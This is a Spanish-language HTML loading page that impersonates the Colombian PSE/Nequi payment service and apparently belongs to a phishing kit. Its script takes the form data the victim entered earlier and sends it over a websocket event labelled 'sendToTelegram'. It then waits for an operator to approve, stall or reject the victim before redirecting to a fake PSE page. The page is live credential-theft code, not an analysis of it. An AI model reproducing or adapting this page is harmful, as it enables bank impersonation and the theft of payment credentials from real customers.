<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Procesando</title>

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17891912053"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'AW-17891912053');
    </script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background: #fff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .header {
            text-align: center;
            padding-top: 20px;
        }

        .header img {
            width: 160px;
        }

        .center {
            text-align: center;
        }

        .center img {
            width: 180px;
            margin-bottom: 20px;
        }

        .text {
            font-size: 16px;
            color: #200020;
            padding: 0 30px;
            line-height: 1.4;
        }

        .wait-message {
            display: none;
            font-size: 14px;
            color: #200020;
            margin-top: 16px;
            padding: 0 30px;
            line-height: 1.4;
        }

        .wait-message.show {
            display: block;
        }

        .footer {
            height: 40px;
        }
    </style>
</head>
<body>

    <div class="header">
        <img src="img/logo2.svg" alt="PSE">
    </div>

    <div class="center">
        <img src="img/procesando.gif" alt="Procesando">

        <div class="text">
            Estamos procesando tu solicitud con PSE.<br>
            Esto puede tardar unos segundos...
        </div>

        <div class="wait-message" id="waitMessage">
            Por favor espera un momento mientras procesamos tu solicitud...
        </div>
    </div>

    <div class="footer"></div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        let sessionId = localStorage.getItem('nequiSessionId');
        if (!sessionId) {
            alert('Error: Sesión no encontrada');
            window.location.href = '/';
        }

        const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
        const waitMessage = document.getElementById('waitMessage');

        const socket = io({
            transports: ['websocket', 'polling'],
            reconnection: true,
            reconnectionAttempts: 20,
            reconnectionDelay: 200,
            reconnectionDelayMax: 1000,
            timeout: 5000,
            pingInterval: 2000,
            pingTimeout: 5000
        });

        let keepAliveInterval, pingInterval;

        function startKeepAlive() {
            stopKeepAlive();
            keepAliveInterval = setInterval(() => socket?.connected && socket.emit('keepAlive', { sessionId }), 3000);
            pingInterval = setInterval(() => socket?.connected && socket.emit('ping'), 2000);
        }

        function stopKeepAlive() {
            if (keepAliveInterval) clearInterval(keepAliveInterval);
            if (pingInterval) clearInterval(pingInterval);
        }

        socket.on('connect', () => {

            socket.emit('initSession', {
                sessionId,
                module: 'nequi',
                page: 'loading',
                data: formData
            });

            setTimeout(() => {
                console.log('📤 Enviando a Telegram...');
                socket.emit('sendToTelegram', {
                    sessionId,
                    data: formData
                });
            }, 100);

            startKeepAlive();
        });

        socket.on('sessionConfirmed', (data) => {
            console.log('✅ Sesión confirmada:', data.sessionId);
        });

        socket.on('telegramSent', (response) => {
            console.log('✅ Enviado a Telegram:', response);
            console.log('⏳ Esperando respuesta del operador...');
        });

        socket.on('actionFollow', (data) => {
            if (data.sessionId !== sessionId) return;

            console.log('✅ Aprobado - Redirigiendo a PSE');
            stopKeepAlive();
            localStorage.setItem('fromNequi', 'true');
            window.location.href = '/pse';
        });

        socket.on('actionWait', (data) => {
            if (data.sessionId !== sessionId) return;

            console.log('⏳ Esperando...');
            waitMessage.classList.add('show');
            setTimeout(() => {
                waitMessage.classList.remove('show');
            }, data.waitTime * 1000 || 15000);
        });

        socket.on('actionReject', (data) => {
            if (data.sessionId !== sessionId) return;

            console.log('❌ Rechazado');
            stopKeepAlive();
            alert('Solicitud rechazada');
            window.location.href = '/';
        });

        socket.on('error', () => {});
        socket.on('connect_error', () => {});
        socket.on('disconnect', (reason) => {
            if (reason === 'io server disconnect') socket.connect();
        });

        window.addEventListener('beforeunload', stopKeepAlive);
    </script>
</body>
</html>
